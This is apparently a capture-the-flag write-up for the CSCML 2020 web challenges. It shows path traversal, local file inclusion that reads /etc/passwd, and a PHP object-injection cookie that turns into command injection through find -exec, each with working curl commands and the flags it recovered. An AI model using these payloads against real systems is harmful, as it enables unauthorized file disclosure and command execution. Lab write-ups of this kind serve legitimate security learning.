# WebServer I

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl $'http://ctf.cscml.zenysec.com:20001/%2E%2E/flag.txt'                                                                                                                                    
CSCML2020{k33p_c41m_4nd_235342ch_0n}
```

# Scroll

In the source of the page is a commented out line for search.php.  When we try to utilize it for LFI it works, looking around we find

```
╭─zoey@virtual-parrot ~/sec/cscml ‹master*› 
╰─$ curl --silent "http://134.122.112.105:20004/search.php?img=/etc/passwd" | grep CSCML
CSCML2020{7h4nk_Y0u_F0R_r34D1N9_My_8L09}
```

# Galleria 1

curl "'http://134.122.94.112/get_files_items.php?debug=TRUE&folder=.."

# Galleria 2

Looking at the initial request we find a cookie that looks like a serialized php string that's been urlencoded `Set-Cookie: tracked=s%3A5%3A%22false%22%3B`

If we start enumerating the rest of the site we'll see that directory listings are possible, and looking in `http://164.90.176.158/assets/php/` we find a
`StatisticsClass.php.bak` file which means we can download the source.  The server is just going to give us the file rather than execute it.  And we see

```php
<?php

class Statistics 
{
    private $counter_output_path = "/tmp/counter";

    public function __construct()
    {
        if (!file_exists($this->counter_output_path))
        {
            system("touch {$this->counter_output_path}");
        }
    }

    public function update($client_ip_address)
    {
        file_put_contents($this->counter_output_path, $client_ip_address . PHP_EOL, FILE_APPEND);
    }

    public function __destruct()
    {
        system('find ' . escapeshellcmd($this->counter_output_path) . ' && echo Statistics Plugin version 1.0 is working');
    }

    public function getNumberOfVisitors()
    {
        return system("wc -l /tmp/counter | awk '{print $1}'");
    }
}
```

This class looks to be vulnerable to object injection given the `__destruct()` call, and it looks like the `system()` call should be vulnerable to
command injection.  Let's try and set something up to generate a payload for us:

```php
<?php

class Statistics {

    private $counter_output_path = ". -name *.php -exec cat {} ;";
}


echo "Cookie: tracked=" . urlencode(serialize(new Statistics())) . "\n";
```

I came up with the above `$counter_output_path` via some trial and error, just to get something in place to test the command injection and give us some
results to see if it worked properly.  Let's try it out.

```
╭─zoey@virtual-parrot ~/sec/cscml/galleria1 ‹master*› 
╰─$ php gen-payload.php 
Cookie: tracked=O%3A10%3A%22Statistics%22%3A1%3A%7Bs%3A31%3A%22%00Statistics%00counter_output_path%22%3Bs%3A28%3A%22.+-name+%2A.php+-exec+cat+%7B%7D+%3B%22%3B%7D
╭─zoey@virtual-parrot ~/sec/cscml/galleria1 ‹master*› 
╰─$ curl --silent -H "Cookie: tracked=O%3A10%3A%22Statistics%22%3A1%3A%7Bs%3A31%3A%22%00Statistics%00counter_output_path%22%3Bs%3A28%3A%22.+-name+%2A.php+-exec+cat+%7B%7D+%3B%22%3B%7D" http://164.90.176.158/ | grep FLAG
</html><?php // S2FLAG:xADGFHSFNDHJBXSETGsg ?>
```

Sending the request the first time it was obvious it was a success as we got the source for every php file included in the response.  I was assuming we'd then need
to go on to search for other files or try to setup a reverse shell, but in the source I saw a comment with `FLAG` in it.  The `grep` in the above it just to filter
out all the other source code and display the flag.